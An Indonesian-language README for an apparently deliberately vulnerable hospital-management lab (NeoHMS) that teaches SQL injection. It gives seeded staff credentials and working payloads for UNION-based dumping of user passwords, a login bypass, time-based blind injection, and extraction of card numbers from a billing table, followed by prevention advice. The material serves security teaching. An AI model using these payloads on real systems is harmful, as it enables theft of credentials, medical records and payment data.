# Simulasi Kerentanan SQL Injection - NeoHMS 🏥

Proyek ini adalah Lab Keamanan Cyber yang mensimulasikan berbagai tipe kerentanan **SQL Injection** pada sistem Manajemen Rumah Sakit (HMS).

## 🚀 Persiapan dengan Docker
Simulasi ini menggunakan MySQL dan PHP yang berjalan di kontainer terpisah.
1. Masuk ke folder proyek:
   ```bash
   cd SqlInjection
   ```
2. Jalankan Docker Compose:
   ```bash
   docker-compose up -d
   ```
3. Inisialisasi Database:
   Buka `http://localhost:8002/setup.php` di browser Anda untuk membuat tabel dan data awal.
4. Akses Aplikasi: `http://localhost:8002`

---

## 👥 Akun Staff (Target Eksploitasi)
| Username | Password | Role |
| :--- | :--- | :--- |
| `admin_hms` | `P@ssw0rdAdmin2026` | Admin |
| `dr_smith` | `smith123` | Doctor |

---

## 🧪 Skenario Simulasi Serangan

### 1. Error-Based & Union-Based (Dumping Data Pasien)
- **Halaman**: `patient.php?id=1`
- **Tujuan**: Mendapatkan nama database dan isi tabel user.
- **Langkah**:
  1. Masukkan `'` (petik tunggal) pada parameter ID untuk melihat error database.
  2. Gunakan UNION untuk mencari jumlah kolom: `?id=1' ORDER BY 5-- -`
  3. Dump database: `?id=1' UNION SELECT 1,database(),user(),@@version,5-- -`
  4. Dump Akun Admin: `?id=1' UNION SELECT 1,username,password,role,5 FROM users-- -`

### 2. Login Bypass (Boolean-Based Blind)
- **Halaman**: `login.php`
- **Langkah**:
  - Masukkan Username: `admin_hms' OR 1=1 -- -`
  - Password: (bebas)
  - Anda akan berhasil masuk ke dashboard tanpa password yang benar.

### 3. Time-Based Blind SQLi (Dumping Rekam Medis)
- **Halaman**: `search.php?name=`
- **Langkah**:
  - Masukkan payload: `Apapun' AND SLEEP(5)-- -`
  - Amati waktu loading halaman. Jika halaman loading selama 5 detik, maka celah terkonfirmasi.
  - Penyerang bisa menggunakan script (seperti SQLMap) untuk mengekstrak data rekam medis secara karakter demi karakter berdasarkan waktu respon.

### 4. Financial Data Breach (Union-Based)
- **Halaman**: `billing.php?invoice_id=1`
- **Langkah**:
  - Gunakan UNION SELECT untuk mencuri data kartu pembayaran:
    `?invoice_id=1' UNION SELECT 1,2,total,payment_method,card_number,6 FROM billing-- -`

---

## 🛡️ Strategi Pencegahan
1. **Prepared Statements**: Gunakan PDO atau MySQLi Prepared Statements (Parametrized Queries).
2. **Input Validation**: Validasi tipe data input (misal ID harus integer).
3. **Least Privilege**: Gunakan user database dengan hak akses terbatas.
4. **Error Handling**: Jangan pernah menampilkan error MySQL mentah ke user di lingkungan produksi (`mysqli_error()`).

---
**⚠️ Peringatan:** Digunakan hanya untuk tujuan edukasi keamanan. Penyalahgunaan teknis ini di luar lingkungan lab adalah tindakan ilegal!
